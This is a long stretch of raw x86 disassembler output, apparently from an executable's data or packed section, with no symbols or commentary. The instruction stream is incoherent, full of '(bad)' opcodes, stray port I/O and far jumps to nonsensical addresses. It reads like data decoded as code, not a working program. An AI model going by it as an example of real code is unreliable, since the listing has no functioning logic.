  4078b1:	addr16 dec ebp
  4078b3:	inc    edi
  4078b4:	out    dx,eax
  4078b5:	adc    dh,BYTE PTR [edi-0x2675ad96]
  4078bb:	xchg   ebp,eax
  4078bc:	add    edx,DWORD PTR ds:[eax+ebx*4-0x2e]
  4078c1:	cmp    al,0x4e
  4078c3:	int    0x62
  4078c5:	loopne 0x4078d1
  4078c7:	add    BYTE PTR [ecx],0x85
  4078ca:	push   0x42fabd00
  4078cf:	sahf   
  4078d0:	xchg   ecx,eax
  4078d1:	push   edx
  4078d2:	imul   ebp,ebp,0x361fbb81
  4078d8:	mov    ch,0xf6
  4078da:	dec    esi
  4078db:	mov    cl,0xcb
  4078dd:	mov    dl,dh
  4078df:	and    DWORD PTR [edi+0x669569d8],ebp
  4078e5:	inc    esp
  4078e6:	mov    al,0xf0
  4078e8:	dec    edx
  4078e9:	adc    BYTE PTR [esi],ah
  4078eb:	shl    DWORD PTR [esi],1
  4078ed:	cmp    al,al
  4078ef:	cmp    al,0xc2
  4078f1:	sbb    al,bl
  4078f3:	push   eax
  4078f4:	out    dx,eax
  4078f5:	les    esi,FWORD PTR [ecx+0xb]
  4078f8:	lea    edi,[edx-0x66]
  4078fb:	cmp    bh,bh
  4078fd:	xlat   BYTE PTR ds:[ebx]
  4078fe:	fld    DWORD PTR [edx+0x5f57a784]
  407904:	nop
  407905:	push   es
  407906:	mov    ecx,DWORD PTR [edx-0x34]
  407909:	loope  0x4078ea
  40790b:	add    al,0xce
  40790d:	sbb    al,0x30
  40790f:	stos   DWORD PTR es:[edi],eax
  407910:	hlt    
  407911:	xor    al,0xf2
  407913:	(bad)  
  407914:	xor    edx,DWORD PTR [ecx]
  407916:	imul   ecx,eax,0xd2b43398
  40791c:	xchg   esp,eax
  40791d:	xchg   ebx,eax
  40791e:	cld    
  40791f:	scas   al,BYTE PTR es:[edi]
  407920:	mov    ds:0x6e1f0226,al
  407925:	fwait
  407926:	pushf  
  407927:	jecxz  0x407954
  407929:	mov    bh,0x63
  40792b:	xchg   edx,eax
  40792c:	cld    
  40792d:	rcl    DWORD PTR [edi-0x13e9ef8c],cl
  407933:	fisttp QWORD PTR [edi]
  407935:	ror    DWORD PTR [eax-0x5e],0x39
  407939:	lods   al,BYTE PTR ds:[esi]
  40793a:	mov    dl,0xaf
  40793c:	ret    0x8f0e
  40793f:	mov    DWORD PTR [edi],esi
  407941:	xor    dl,bh
  407943:	push   0x80e75f41
  407948:	call   0xccac:0xb076e6db
  40794f:	ins    BYTE PTR es:[edi],dx
  407950:	push   ecx
  407951:	inc    esi
  407952:	clc    
  407953:	adc    eax,0x2d1941a8
  407958:	sub    eax,0xc936eb0e
  40795d:	sbb    eax,0xeb79824e
  407962:	clc    
  407963:	scas   al,BYTE PTR es:[edi]
  407964:	jb     0x4078f7
  407966:	lock adc edi,eax
  407969:	mov    esp,DWORD PTR [eax]
  40796b:	dec    esi
  40796c:	xor    esp,DWORD PTR [ebx+0x2b]
  40796f:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  407971:	jp     0x407928
  407973:	xchg   esp,eax
  407974:	pop    esi
  407975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407976:	aas    
  407977:	push   ds
  407978:	(bad)  
  407979:	sbb    DWORD PTR [esi+0x63d7e125],ebp
  40797f:	mov    eax,ds:0xaddf348d
  407984:	sbb    esi,ebp
  407986:	xor    eax,0xca0d54f1
  40798b:	mov    bl,0x3d
  40798d:	sbb    DWORD PTR [eax-0x6f],0xffffffd1
  407991:	mov    bl,dh
  407993:	mov    ss,WORD PTR [ebx-0x1e29b994]
  407999:	in     al,dx
  40799a:	xchg   edi,eax
  40799b:	addr16 pop ebp
  40799d:	pop    ebx
  40799e:	cmc    
  40799f:	cmp    cl,0x16
  4079a2:	cmp    BYTE PTR [edi],bl
  4079a4:	(bad)  
  4079a5:	ret    0xf404
  4079a8:	stos   BYTE PTR es:[edi],al
  4079a9:	out    dx,eax
  4079aa:	pop    DWORD PTR [ebx]
  4079ac:	shr    BYTE PTR [ebx],1
  4079ae:	inc    esi
  4079af:	imul   edx,DWORD PTR [edi+0x3b5b4af9],0xe2f14279
  4079b9:	bound  ebx,QWORD PTR [esi-0x518077f0]
  4079bf:	pop    ss
  4079c0:	xchg   DWORD PTR gs:[esi],ebp
  4079c3:	int    0xde
  4079c5:	mov    ebp,0x7ef0f701
  4079ca:	xchg   ebp,eax
  4079cb:	and    BYTE PTR [esi-0x7aa34b46],dl
  4079d1:	jae    0x4079d1
  4079d3:	fild   DWORD PTR [ebx]
  4079d5:	out    dx,eax
  4079d6:	xchg   DWORD PTR [ebp-0x4e],eax
  4079d9:	scas   al,BYTE PTR es:[edi]
  4079da:	lods   eax,DWORD PTR ds:[esi]
  4079db:	xchg   bl,ch
  4079dd:	jg     0x4079c1
  4079df:	sub    BYTE PTR [eax+0x7fa180e6],dl
  4079e5:	push   ss
  4079e6:	and    esp,DWORD PTR [ebx]
  4079e8:	sbb    al,0xe1
  4079ea:	emms   
  4079ec:	fwait
  4079ed:	dec    ebx
  4079ee:	call   0x2424264a
  4079f3:	std    
  4079f4:	sbb    eax,0xb32cc01c
  4079f9:	push   0x9248d99a
  4079fe:	add    DWORD PTR ds:0x7fc31f53,ecx
  407a04:	hlt    
  407a05:	call   0x4bb1:0xa5336c6
  407a0c:	and    BYTE PTR [edi+0x3f],bh
  407a0f:	sahf   
  407a10:	daa    
  407a11:	fld    TBYTE PTR [esi+0x50]
  407a14:	ret    
  407a15:	rcl    DWORD PTR [ebp+0x57],cl
  407a18:	cli    
  407a19:	(bad)  [edx]
  407a1b:	cmp    dl,BYTE PTR [bx+di]
  407a1e:	shr    DWORD PTR [edi],1
  407a20:	dec    esp
  407a21:	dec    eax
  407a22:	lods   eax,DWORD PTR ds:[esi]
  407a23:	sbb    BYTE PTR [edi],0xa6
  407a26:	dec    esi
  407a27:	mov    ds:0x236813e,eax
  407a2c:	pop    edi
  407a2d:	bound  ecx,QWORD PTR [edi-0x62]
  407a30:	ins    BYTE PTR es:[edi],dx
  407a31:	fcomp  QWORD PTR [ecx+eiz*2]
  407a34:	call   0xcd22:0xc3384874
  407a3b:	xchg   edi,eax
  407a3c:	jnp    0x407a26
  407a3e:	adc    DWORD PTR [ebx],ebx
  407a40:	jmp    0xe4a81416
  407a45:	inc    esi
  407a46:	pushf  
  407a47:	jecxz  0x407a61
  407a49:	sbb    ebp,DWORD PTR [esp+ecx*8-0x54996d19]
  407a50:	dec    edi
  407a51:	sub    ebx,DWORD PTR [esi+0x1e]
  407a54:	into   
  407a55:	add    ah,ch
  407a57:	data16 stos BYTE PTR es:[edi],al
  407a59:	dec    esp
  407a5a:	inc    ebx
  407a5b:	add    dl,dl
  407a5d:	push   0xe87dc5a3
  407a62:	xor    dh,BYTE PTR [edi-0x7e93d8a8]
  407a68:	and    DWORD PTR [ecx],edx
  407a6a:	inc    esp
  407a6b:	add    al,0xe0
  407a6d:	cs inc eax
  407a6f:	or     al,0x75
  407a71:	shl    DWORD PTR [ecx-0x59],cl
  407a74:	test   al,al
  407a76:	dec    eax
  407a77:	push   ds
  407a78:	mov    al,ds:0x4b2667a3
  407a7d:	call   0xa75ffbdb
  407a82:	in     al,0x8d
  407a84:	jbe    0x407a36
  407a86:	out    0x8e,eax
  407a88:	xchg   esp,eax
  407a89:	sub    DWORD PTR [edx+0x5a3fb4a1],esp
  407a8f:	call   0x46c438ab
  407a94:	mov    bh,0xdf
  407a96:	(bad)  
  407a97:	jecxz  0x407ac5
  407a99:	and    bh,BYTE PTR [edi+ebx*4+0x2e]
  407a9d:	out    dx,eax
  407a9e:	or     al,0x3f
  407aa0:	lea    esp,[ecx-0x18]
  407aa3:	aad    0xb6
  407aa5:	(bad)  
  407aa6:	mov    DWORD PTR ds:[eax+0x45adda85],edi
  407aad:	lock jb 0x407a66
  407ab0:	cld    
  407ab1:	jmp    0x407a34
  407ab3:	ret    
  407ab4:	pop    ecx
  407ab5:	cmp    eax,0xd9b87ebe
  407aba:	ss inc ecx
  407abc:	das    
  407abd:	xchg   ebp,eax
  407abe:	das    
  407abf:	imul   ecx,DWORD PTR [edi-0x100fe72b],0x1d
  407ac6:	sbb    eax,0x46345421
  407acb:	ja     0x407ad1
  407acd:	cmp    eax,0x28ddcdd9
  407ad2:	mov    dl,0xaa
  407ad4:	(bad)  
  407ad5:	in     al,0x28
  407ad7:	loop   0x407b4f
  407ad9:	test   ah,0x7c
  407adc:	js     0x407a83
  407ade:	jge    0x407a8a
  407ae0:	jmp    0xe6dea221
  407ae5:	jecxz  0x407b41
  407ae7:	pop    esp
  407ae8:	sbb    al,0x22
  407aea:	in     al,0x17
  407aec:	mov    ebp,0xf188218a
  407af1:	inc    ebx
  407af2:	(bad)  
  407af3:	fnstsw WORD PTR [esi+ebx*1+0x7f]
  407af7:	sar    BYTE PTR [ecx-0x62128993],0x53
  407afe:	dec    ebp
  407aff:	add    DWORD PTR [ebp-0x2f],esp
  407b02:	fdivr  DWORD PTR [eax-0x8236831]
  407b08:	call   0x7b3437e4
  407b0d:	mov    esp,0x2ad835b8
  407b12:	mov    dl,0x77
  407b14:	pop    edi
  407b15:	jns    0x407ab1
  407b17:	bound  ebp,QWORD PTR ds:0x6478d0c0
  407b1d:	or     DWORD PTR [eax-0x70b325e1],esi
  407b23:	mov    al,0xa8
  407b25:	icebp  
  407b26:	in     al,0xf7
  407b28:	adc    cl,al
  407b2a:	mov    dh,0x42
  407b2c:	ja     0x407b04
  407b2e:	push   edx
  407b2f:	jb     0x407b8a
  407b31:	das    
  407b32:	push   ecx
  407b33:	push   ss
  407b34:	mov    ecx,0x1ddd69de
  407b39:	test   cl,al
  407b3b:	or     eax,0x5258dab3
  407b40:	icebp  
  407b41:	mov    al,ds:0x5fa96f33
  407b46:	or     al,0x9c
  407b48:	push   eax
  407b49:	fst    DWORD PTR [edi-0x6dcd3ed1]
  407b4f:	shr    DWORD PTR [edi],1
  407b51:	lods   al,BYTE PTR ds:[esi]
  407b52:	add    eax,0x5a097e65
  407b57:	js     0x407bb7
  407b59:	sbb    DWORD PTR [esi+0x21b9ec30],ebx
  407b5f:	mov    ds:0x3ff01d2e,al
  407b64:	fcomp  QWORD PTR [eax]
  407b66:	cmp    dl,dl
  407b68:	retf   
  407b69:	shl    BYTE PTR [esi],0x99
  407b6c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b6d:	mov    dl,0x72
  407b6f:	jb     0x407b8a
  407b71:	dec    eax
  407b72:	shl    bh,1
  407b74:	pushf  
  407b75:	loope  0x407bd9
  407b77:	out    dx,al
  407b78:	mov    eax,ds:0x6017f4c4
  407b7d:	mov    edi,0xe10076cd
  407b82:	repz add BYTE PTR [ebx],ch
  407b85:	push   ecx
  407b86:	ins    DWORD PTR es:[edi],dx
  407b87:	jbe    0x407b34
  407b89:	pinsrw mm2,WORD PTR [ecx+0x572f1273],0xc7
  407b91:	(bad)  
  407b92:	and    BYTE PTR [bx+si+0x61],bh
  407b96:	lock sbb al,0x50
  407b99:	xchg   ebx,eax
  407b9a:	daa    
  407b9b:	les    ecx,FWORD PTR [edi+0x7e]
  407b9e:	clc    
  407b9f:	pop    edi
  407ba0:	sar    DWORD PTR [edx-0x7b],1
  407ba3:	mov    esp,0x3cb172be
  407ba8:	push   ds
  407ba9:	mov    ah,0x65
  407bab:	je     0x407b6f
  407bad:	mov    ebx,0x94308394
  407bb2:	gs pop esi
  407bb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bb5:	addr16 hlt 
  407bb7:	sbb    cl,ah
  407bb9:	pusha  
  407bba:	or     DWORD PTR [ecx],0xffffffcc
  407bbd:	pushf  
  407bbe:	shl    edx,0xfe
  407bc1:	push   esp
  407bc2:	clc    
  407bc3:	loopne 0x407ba3
  407bc5:	mov    BYTE PTR ds:[esi],ch
  407bc8:	pop    ss
  407bc9:	adc    BYTE PTR [ecx+ecx*4-0xa],ch
  407bcd:	sti    
  407bce:	sub    ecx,DWORD PTR [edi+0x24]
  407bd1:	or     eax,0x637fd2e2
  407bd6:	and    eax,0x874da9f4
  407bdb:	mov    ecx,0x367fcd8f
  407be0:	push   0x71acde7b
  407be5:	xchg   esp,eax
  407be6:	cdq    
  407be7:	lea    edi,[edx+0x74]
  407bea:	loop   0x407c4f
  407bec:	adc    DWORD PTR [ebx-0xae211f1],0xb97d3797
  407bf6:	sub    DWORD PTR [edx],edi
  407bf8:	push   ebp
  407bf9:	stc    
  407bfa:	jne    0x407bca
  407bfc:	sub    ah,BYTE PTR [edx+0x2896922b]
  407c02:	mov    WORD PTR [ebp+0x1],ds
  407c05:	sbb    ah,BYTE PTR [edi]
  407c07:	mov    ebx,0xac4c7ce5
  407c0c:	and    al,0xc9
  407c0e:	imul   esp,DWORD PTR [edi],0x12
  407c11:	popa   
  407c12:	xor    eax,0x3ec379f
  407c17:	cmc    
  407c18:	dec    eax
  407c19:	mov    esi,0x2ce3fca9
  407c1e:	jmp    0x831d8ad4
  407c23:	ja     0x407c54
  407c25:	imul   ecx,esp,0x1c868af3
  407c2b:	repz in eax,dx
  407c2d:	pop    ebp
  407c2e:	inc    edi
  407c2f:	lock push ebp
  407c31:	mov    ebx,0xba9f6ea6
  407c36:	mov    DWORD PTR ds:0x4062fe89,0xac154fd
  407c40:	cmp    ebp,DWORD PTR [edi]
  407c42:	out    0xc1,al
  407c44:	and    DWORD PTR [esi+0x451921e9],edi
  407c4a:	or     ebp,DWORD PTR [ecx-0x7d]
  407c4d:	(bad)  
  407c4e:	lock ret 
  407c50:	xor    DWORD PTR [eax],0x28c72039
  407c56:	xchg   BYTE PTR [edx+0x6a],bl
  407c59:	sti    
  407c5a:	std    
  407c5b:	add    dl,cl
  407c5d:	inc    edx
  407c5e:	jmp    0x407c56
  407c60:	call   0xe4be:0x585e8cf
  407c67:	and    bl,dh
  407c69:	adc    edi,edi
  407c6b:	mov    al,ah
  407c6d:	rcl    BYTE PTR [esi],cl
  407c6f:	bound  edx,QWORD PTR [eax-0x4f5a63ff]
  407c75:	sub    eax,0xc1decc8b
  407c7a:	xlat   BYTE PTR ds:[ebx]
  407c7b:	pop    es
  407c7c:	lods   eax,DWORD PTR ds:[esi]
  407c7d:	mov    ds,WORD PTR [edi-0xa766d60]
  407c83:	mov    dh,0xfb
  407c85:	xchg   bl,dh
  407c87:	mov    ebx,0x628d4879
  407c8c:	xchg   ebp,eax
  407c8d:	mov    edx,0xcd1ca0e1
  407c92:	popf   
  407c93:	outs   dx,DWORD PTR ds:[esi]
  407c94:	inc    edx
  407c95:	inc    esi
  407c96:	mov    bl,0x13
  407c98:	adc    BYTE PTR [esi+0x4a],0x5e
  407c9c:	push   0x21fd01d5
  407ca1:	(bad)  
  407ca2:	mov    ch,0xea
  407ca4:	push   esp
  407ca5:	mov    al,ds:0xcbc83039
  407caa:	xadd   BYTE PTR [edx],al
  407cad:	shr    BYTE PTR [eax+0xb6b981f],cl
  407cb3:	xchg   edx,eax
  407cb4:	imul   ebx,DWORD PTR [ebp+0x46],0xc
  407cb8:	(bad)  
  407cb9:	sbb    esi,DWORD PTR ds:0xc280ab8
  407cbf:	enter  0x3ce9,0xd8
  407cc3:	imul   esp,ecx,0xc0ae9314
  407cc9:	jle    0x407c51
  407ccb:	mov    ebp,0xa64fbe09
  407cd0:	cmp    al,0xba
  407cd2:	bound  ebp,QWORD PTR [esi]
  407cd4:	inc    eax
  407cd5:	addr16 aad 0x90
  407cd8:	push   cs
  407cd9:	cdq    
  407cda:	or     ebp,ebx
  407cdc:	mov    al,0x5f
  407cde:	iret   
  407cdf:	and    BYTE PTR [esi+0x22],al
  407ce2:	les    ebx,FWORD PTR [ebp-0x2037db5d]
  407ce8:	adc    BYTE PTR [esi],al
  407cea:	sbb    eax,0x21a49daa
  407cef:	inc    ebx
  407cf0:	rol    DWORD PTR [eax+0x51],1
  407cf3:	sbb    ah,ah
  407cf5:	fsubp  st(0),st
  407cf7:	loop   0x407cfe
  407cf9:	jnp    0x407ccf
  407cfb:	ins    BYTE PTR es:[edi],dx
  407cfc:	loope  0x407cc9
  407cfe:	mov    esp,0x4cdeceab
  407d03:	scas   al,BYTE PTR es:[edi]
  407d04:	in     al,dx
  407d05:	les    eax,FWORD PTR [eax-0x16cdd03b]
  407d0b:	das    
  407d0c:	clc    
  407d0d:	inc    ebp
  407d0e:	(bad)  
  407d0f:	scas   al,BYTE PTR es:[edi]
  407d10:	xchg   DWORD PTR [edx+esi*2],ebp
  407d13:	cwde   
  407d14:	adc    BYTE PTR [eax-0x25],0x86
  407d18:	(bad)  [esi-0x69cef6be]
  407d1e:	jne    0x407d12
  407d20:	and    eax,DWORD PTR [ecx+0x1d]
  407d23:	mov    ch,0x78
  407d25:	xchg   edi,eax
  407d26:	jg     0x407d80
  407d28:	mov    cl,0x4a
  407d2a:	add    BYTE PTR [edx+edi*1+0x7465363a],cl
  407d31:	(bad)  
  407d33:	mov    eax,0xedacf3f1
  407d38:	cmp    BYTE PTR [edi],bl
  407d3a:	mov    edi,esi
  407d3c:	bswap  eax
  407d3e:	mov    ah,0x9b
  407d40:	nop
  407d41:	xchg   ebp,eax
  407d42:	pop    ebx
  407d43:	sub    ch,BYTE PTR [ebp+0x57b64a04]
  407d49:	call   0xc5ae:0x9c5397f5
  407d50:	fldcw  WORD PTR [esp+esi*1]
  407d53:	add    DWORD PTR [ebp+0x65],0x5e
  407d57:	bound  ecx,QWORD PTR [ebp-0x2a]
  407d5a:	inc    ebx
  407d5b:	or     BYTE PTR [edx-0x19],cl
  407d5e:	cmp    dl,0xf7
  407d61:	inc    ebx
  407d62:	or     eax,0x90d2703d
  407d67:	test   eax,0xad61157b
  407d6c:	or     bh,bl
  407d6e:	push   ds
  407d6f:	xchg   BYTE PTR [ecx],ah
  407d71:	push   0xffffffff
  407d73:	scas   eax,DWORD PTR es:[edi]
  407d74:	push   es
  407d75:	hlt    
  407d76:	(bad)  
  407d77:	iret   
  407d78:	test   DWORD PTR [ebp+0x37],ebx
  407d7b:	fsubr  st(2),st
  407d7d:	jo     0x407d34
  407d7f:	cli    
  407d80:	enter  0xcb8b,0x11
  407d84:	addr16 xchg edx,eax
  407d86:	test   DWORD PTR ds:0x9bb3bd58,eax
  407d8c:	adc    edx,DWORD PTR ds:0x3a3bea79
  407d92:	sbb    bl,BYTE PTR [eax-0x49]
  407d95:	push   0x2876e0dd
  407d9a:	fidiv  WORD PTR [ecx+0x42d11de7]
  407da0:	js     0x407d7e
  407da2:	add    BYTE PTR [eax+edx*2-0x342e2c58],ch
  407da9:	test   esi,esp
  407dab:	or     esi,DWORD PTR [esi]
  407dad:	mov    eax,0x508d6fb2
  407db2:	imul   ebp,DWORD PTR [ebp+eiz*1+0x2cda5a3b],0x3674d54f
  407dbd:	test   al,0x14
  407dbf:	inc    ebp
  407dc0:	div    BYTE PTR [edx]
  407dc2:	sbb    BYTE PTR [edx],ch
  407dc4:	xchg   edx,eax
  407dc5:	push   0xffffff95
  407dc7:	data16 mov al,ds:0x59e40e3b
  407dcd:	js     0x407da3
  407dcf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407dd0:	dec    edi
  407dd1:	popf   
  407dd2:	push   cs
  407dd3:	jns    0x407e27
  407dd5:	out    dx,eax
  407dd6:	mov    cl,cl
  407dd8:	mov    BYTE PTR [edi+0x2229dcbb],0x12
  407ddf:	xor    eax,0x7ecf609b
  407de4:	xchg   DWORD PTR [ebp+0x3a5722f8],esi
  407dea:	jne    0x407dfa
  407dec:	clc    
  407ded:	test   BYTE PTR [ecx+0x1c6fb02f],0x11
  407df4:	fcomp  DWORD PTR [ecx-0x60]
  407df7:	aad    0xfd
  407df9:	jno    0x407d84
  407dfb:	and    bh,0xb5
  407dfe:	(bad)  [edi+edx*8-0x4d621750]
  407e05:	push   esp
  407e06:	outs   dx,BYTE PTR ds:[esi]
  407e07:	mov    ah,0xe7
  407e09:	mov    edx,0x38e913d5
  407e0e:	or     ecx,DWORD PTR [eax-0x11363bc0]
  407e14:	push   cs
  407e15:	sbb    al,0xeb
  407e17:	les    edi,FWORD PTR [ebp+0x2f]
  407e1a:	add    eax,0xe777bdd7
  407e1f:	mov    dl,0xb3
  407e21:	dec    ecx
  407e22:	mov    ebx,DWORD PTR ds:0x4ab13a14
  407e28:	notrack call ebx
  407e2b:	leave  
  407e2c:	and    ch,BYTE PTR [ecx+0x1f]
  407e2f:	mov    al,0x6
  407e31:	lock daa 
  407e33:	sar    BYTE PTR [ebx+0x1d0a2c6],1
  407e39:	hlt    
  407e3a:	mov    ecx,0xf393bbd4
  407e3f:	jns    0x407e62
  407e41:	push   0x47
  407e43:	mov    esp,0x618a6e87
  407e48:	cdq    
  407e49:	mov    edx,0xf6cdc123
  407e4e:	(bad)  
  407e4f:	js     0x407ead
  407e51:	add    BYTE PTR [edi+0x58698257],0x60
  407e58:	inc    edx
  407e59:	xchg   edi,eax
  407e5a:	or     edx,DWORD PTR [ecx]
  407e5c:	cwde   
  407e5d:	and    bh,BYTE PTR [eax+ecx*2]
  407e60:	jbe    0x407e16
  407e62:	mov    edi,0x5475f4b5
  407e67:	cmp    bl,bh
  407e69:	stos   DWORD PTR es:[edi],eax
  407e6a:	xor    DWORD PTR [esi+0x2b65f54e],esp
  407e70:	cmps   BYTE PTR ss:[esi],BYTE PTR es:[edi]
  407e72:	sub    edi,ebp
  407e74:	inc    esp
  407e75:	and    BYTE PTR [ebp+0x5],bh
  407e78:	mov    esp,0xfad48c8c
  407e7d:	push   es
  407e7e:	xor    bh,BYTE PTR [ebp-0x742fbe75]
  407e84:	rcl    BYTE PTR [ecx-0x58],1
  407e87:	cli    
  407e88:	cli    
  407e89:	icebp  
  407e8a:	add    al,0x60
  407e8c:	int    0xf1
  407e8e:	and    eax,0x7b3563cb
  407e93:	ffree  st(5)
  407e95:	mov    BYTE PTR [ebx+0x17],bl
  407e98:	xor    BYTE PTR [edx],dl
  407e9a:	inc    edx
  407e9b:	mov    ds:0x63d43ea3,al
  407ea0:	or     ebx,DWORD PTR [eax]
  407ea2:	stc    
  407ea3:	jmp    0x407ee5
  407ea5:	fsub   QWORD PTR [ebx]
  407ea7:	pop    ss
  407ea8:	sub    eax,0x7d119816
  407ead:	shl    cl,cl
  407eaf:	push   esi
  407eb0:	pop    ecx
  407eb1:	push   ds
  407eb2:	test   al,0x76
  407eb4:	int    0xb7
  407eb6:	adc    BYTE PTR [eax],bh
  407eb8:	jecxz  0x407e8e
  407eba:	push   0xf4bdc36b
  407ebf:	(bad)  
  407ec1:	jo     0x407f0f
  407ec3:	scas   al,BYTE PTR es:[edi]
  407ec4:	sar    esi,0x14
  407ec7:	jo     0x407f2b
  407ec9:	(bad)  
  407ecb:	cmp    bh,BYTE PTR [eax-0x5c]
  407ece:	lea    ecx,[edx-0x57]
  407ed1:	popa   
  407ed2:	mov    ah,0x27
  407ed4:	shl    DWORD PTR [ebp+0x1c269a78],0x15
  407edb:	aad    0xf1
  407edd:	into   
  407ede:	or     ecx,DWORD PTR [esi+edx*2+0x2fdb0fcc]
  407ee5:	sbb    al,0x2a
  407ee7:	xor    eax,0x9d25eee2
  407eec:	push   es
  407eed:	repnz into 
  407eef:	push   0xffffffa9
  407ef1:	adc    bl,BYTE PTR [ebx]
  407ef3:	fsqrt  
  407ef5:	inc    esp
  407ef6:	ret    0xf45e
  407ef9:	add    eax,0x7aabacb0
  407efe:	rcr    DWORD PTR [edi+esi*4+0x44f4c6fa],0x4
  407f06:	mov    dh,0x15
  407f08:	pop    ecx
  407f09:	mov    edx,0x3e3f7f52
  407f0e:	inc    ebp
  407f0f:	jns    0x407f4e
  407f11:	mov    edx,0xbeec9825
  407f16:	jge    0x407f27
  407f18:	sub    al,0x15
  407f1a:	ret    0x4d47
  407f1d:	sub    bl,0x57
  407f20:	mov    al,ds:0x939cdc35
  407f25:	push   ss
  407f26:	jge    0x407f29
  407f28:	enter  0x4462,0x20
  407f2c:	mov    eax,ds:0xe34eca5e
  407f31:	rcl    ecx,cl
  407f33:	dec    ebx
  407f34:	mov    dl,0x26
  407f36:	test   al,0x35
  407f38:	cmp    eax,0xf69ac537
  407f3d:	add    eax,0xc806a3b8
  407f42:	pop    ecx
  407f43:	(bad)  
  407f44:	(bad)  
  407f45:	pop    ebx
  407f46:	mov    edx,0x59c50407
  407f4b:	xlat   BYTE PTR ds:[ebx]
  407f4c:	dec    ebp
  407f4d:	mov    al,0x6c
  407f4f:	in     eax,dx
  407f50:	mov    cl,BYTE PTR [edx]
  407f52:	ror    esi,1
  407f54:	adc    al,BYTE PTR [edi+edx*2-0x5d]
  407f58:	sbb    ch,dh
  407f5a:	repnz or al,0x88
  407f5d:	jge    0x407f2c
  407f5f:	mov    esi,0x47f3f2df
  407f64:	adc    BYTE PTR [edi+edx*8],al
  407f67:	mov    ecx,0x9629a9b7
  407f6c:	mov    bl,0x3d
  407f6e:	dec    ecx
  407f6f:	repnz mov ch,BYTE PTR [edx]
  407f72:	fwait
  407f73:	jae    0x407fdb
  407f75:	or     ebp,DWORD PTR [ebx-0x2cf93c10]
  407f7b:	fnstenv [ecx]
  407f7d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f7e:	lds    ebx,FWORD PTR [esi-0x53ad1d15]
  407f84:	jle    0x407f74
  407f86:	fdivr  QWORD PTR [edi+0x2842c5ff]
  407f8c:	mov    ebx,eax
  407f8e:	rcr    BYTE PTR [eax-0x6cbbc4f7],1
  407f94:	int    0x72
  407f96:	mov    bh,BYTE PTR [edi+eiz*2-0x55972642]
  407f9d:	mov    dl,0xe7
  407f9f:	into   
  407fa0:	lock mov ecx,0xd8b406b4
  407fa6:	add    BYTE PTR [edi-0x74],cl
  407fa9:	call   0x890a85d1
  407fae:	lods   eax,DWORD PTR ds:[esi]
  407faf:	add    al,0xc3
  407fb1:	add    al,0xf2
  407fb3:	loope  0x407f52
  407fb5:	pop    ebx
  407fb6:	push   ds
  407fb7:	mov    esi,0x1a252396
  407fbc:	loopne 0x407f97
  407fbe:	inc    ebx
  407fbf:	mov    ah,0x1a
  407fc1:	test   al,0xa9
  407fc3:	and    eax,0x3a84ebb
  407fc8:	stos   BYTE PTR es:[edi],al
  407fc9:	popa   
  407fca:	rcr    DWORD PTR [edx],0xa
  407fcd:	dec    edi
  407fce:	imul   edx,DWORD PTR [bx+si],0xef35e3c7
  407fd5:	mov    cl,0xe5
  407fd7:	icebp  
  407fd8:	ror    ah,cl
  407fda:	lea    esp,[esi+0x24]
  407fdd:	aaa    
  407fde:	jecxz  0x407fd6
  407fe0:	mov    ah,0x95
  407fe2:	(bad)  
  407fe5:	push   eax
  407fe6:	sbb    esi,0x6922477b
  407fec:	sub    BYTE PTR [eax-0x3b9cabc5],ch
  407ff2:	daa    
  407ff3:	retfw  
  407ff5:	aaa    
  407ff6:	retf   0xd703
  407ff9:	mov    edx,0xf4e7ce9d
  407ffe:	fwait
  407fff:	push   ss
  408000:	add    al,0x3d
  408002:	jmp    0x407fa9
  408004:	pop    ecx
  408005:	push   esi
  408006:	add    BYTE PTR [esi+0x28],bl
  408009:	xchg   esi,eax
  40800a:	dec    ecx
  40800b:	sahf   
  40800c:	cmp    al,0xff
  40800e:	jmp    0x81d8:0x77264357
  408015:	test   DWORD PTR [ebp+0x7031a231],esi
  40801b:	mov    ebp,0x27e5a482
  408020:	shl    esp,cl
  408022:	arpl   WORD PTR [ebp+0x4b],bx
  408025:	imul   ebp,ecx,0x52f9b5d2
  40802b:	test   DWORD PTR [ecx-0x79f71973],esi
  408031:	(bad)  
  408032:	nop
  408033:	test   DWORD PTR [esi-0x2b],edx
  408036:	lock aam 0x75
  408039:	xchg   edx,eax
  40803a:	and    bl,BYTE PTR [eax+0x12]
  40803d:	xchg   esp,eax
  40803e:	xor    BYTE PTR [esi+0x798095eb],0xd8
  408045:	or     eax,0x773cf208
  40804a:	add    al,0xea
  40804c:	idiv   DWORD PTR [edx+0x70]
  40804f:	jp     0x407ffc
  408051:	aaa    
  408052:	aaa    
  408053:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408054:	lods   al,BYTE PTR ds:[esi]
  408055:	sub    DWORD PTR [edx+0xe],0x4
  408059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40805a:	je     0x408023
  40805c:	ss dec esi
  40805e:	cmp    DWORD PTR [edi-0x204b2f09],ecx
  408064:	jns    0x408006
  408066:	(bad)  
  408067:	out    0xd1,eax
  408069:	arpl   WORD PTR [ebp-0x3b60f62],bx
  40806f:	scas   eax,DWORD PTR es:[edi]
  408070:	hlt    
  408071:	jne    0x408085
  408073:	out    0x80,al
  408075:	scas   eax,DWORD PTR es:[edi]
  408076:	mov    bh,0xcc
  408078:	ins    BYTE PTR es:[edi],dx
  408079:	cmp    BYTE PTR [ebx-0x65],bh
  40807c:	jae    0x408084
  40807e:	xor    ebx,0xa0e2ae63
  408084:	stos   DWORD PTR es:[edi],eax
  408085:	nop
  408086:	mov    dh,0x9d
  408089:	shr    BYTE PTR [eax+0x2a72236f],1
  40808f:	je     0x40806b
  408091:	or     DWORD PTR [eax+0x4ceddd5],eax
  408097:	jl     0x4080a9
  408099:	int3   
  40809a:	push   ss
  40809b:	jnp    0x40810c
  40809d:	sahf   
  40809e:	adc    DWORD PTR [esi-0x7cf7312],esi
  4080a4:	mov    WORD PTR [esi-0x5e92583a],?
  4080aa:	add    eax,0x62938ceb
  4080af:	stos   DWORD PTR es:[edi],eax
  4080b0:	mov    dh,dl
  4080b2:	inc    esi
  4080b3:	sub    BYTE PTR [edx-0x1901473f],ah
  4080b9:	xchg   ebx,eax
  4080ba:	lods   al,BYTE PTR ds:[esi]
